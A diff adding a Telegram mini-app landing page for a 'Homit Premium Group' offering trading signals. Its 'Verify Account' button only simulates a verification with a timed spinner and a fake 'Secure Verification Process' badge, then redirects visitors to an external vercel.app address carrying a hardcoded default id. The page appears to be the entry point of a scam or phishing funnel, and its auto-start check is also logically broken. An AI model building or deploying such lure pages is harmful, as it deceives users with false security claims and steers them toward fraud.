@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Homit Support - Premium Group Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #718096;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .features {
+            margin: 30px 0;
+            text-align: left;
+        }
+
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #f7fafc;
+            border-radius: 10px;
+        }
+
+        .feature-icon {
+            width: 24px;
+            height: 24px;
+            background: #667eea;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 12px;
+            color: white;
+        }
+
+        .feature-text {
+            font-size: 14px;
+            color: #4a5568;
+            font-weight: 500;
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .verify-btn:active {
+            transform: translateY(0);
+        }
+
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #718096;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 12px;
+            color: #a0aec0;
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            background: #f0fff4;
+            color: #38a169;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 500;
+            margin-top: 10px;
+        }
+
+        .security-badge::before {
+            content: '🔒';
+            margin-right: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .title {
+                font-size: 20px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">H</div>
+        
+        <h1 class="title">Homit Premium Group</h1>
+        <p class="subtitle">Join our exclusive community and get access to premium content, signals, and expert insights.</p>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">📈</div>
+                <div class="feature-text">Premium Trading Signals</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">💎</div>
+                <div class="feature-text">Exclusive Market Analysis</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🚀</div>
+                <div class="feature-text">Early Access to Opportunities</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">👥</div>
+                <div class="feature-text">Expert Community Support</div>
+            </div>
+        </div>
+
+        <button class="verify-btn" onclick="startVerification()">
+            🔐 Verify Account & Join Group
+        </button>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <div class="status">Verifying your account...</div>
+        </div>
+
+        <div class="security-badge">Secure Verification Process</div>
+
+        <div class="footer">
+            <p>By joining, you agree to our terms of service and community guidelines.</p>
+            <p>© 2024 Homit Support. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        // Get URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const startParam = urlParams.get('startapp') || urlParams.get('start');
+        
+        // Initialize Telegram WebApp if available
+        if (window.Telegram && window.Telegram.WebApp) {
+            try {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+                
+                // Set theme colors
+                const themeParams = window.Telegram.WebApp.themeParams;
+                if (themeParams) {
+                    document.documentElement.style.setProperty('--tg-theme-bg-color', themeParams.bg_color || '#ffffff');
+                    document.documentElement.style.setProperty('--tg-theme-text-color', themeParams.text_color || '#000000');
+                }
+            } catch (e) {
+                console.log('Telegram WebApp not available:', e);
+            }
+        }
+
+        function startVerification() {
+            const btn = document.querySelector('.verify-btn');
+            const loading = document.getElementById('loading');
+            
+            // Show loading state
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Simulate verification process
+            setTimeout(() => {
+                // Redirect to the verification URL
+                const verificationUrl = `https://caca-seven.vercel.app/?arg=${startParam || '6735653727_D'}`;
+                
+                // Try to open in Telegram WebApp first
+                if (window.Telegram && window.Telegram.WebApp) {
+                    try {
+                        window.Telegram.WebApp.openTelegramLink(verificationUrl);
+                    } catch (e) {
+                        // Fallback to regular redirect
+                        window.location.href = verificationUrl;
+                    }
+                } else {
+                    // Fallback to regular redirect
+                    window.location.href = verificationUrl;
+                }
+            }, 2000); // 2 second delay to show loading
+        }
+
+        // Auto-start verification after 5 seconds if no interaction
+        let autoStartTimer = setTimeout(() => {
+            if (!document.querySelector('.verify-btn').style.display === 'none') {
+                startVerification();
+            }
+        }, 5000);
+
+        // Clear auto-start timer if user interacts
+        document.addEventListener('click', () => {
+            clearTimeout(autoStartTimer);
+        });
+
+        // Handle back button
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.BackButton.onClick(() => {
+                window.Telegram.WebApp.close();
+            });
+        }
+
+        // Log for debugging
+        console.log('Homit Support Mini-App loaded');
+        console.log('Start parameter:', startParam);
+        console.log('User agent:', navigator.userAgent);
+    </script>
+</body>
+</html> 
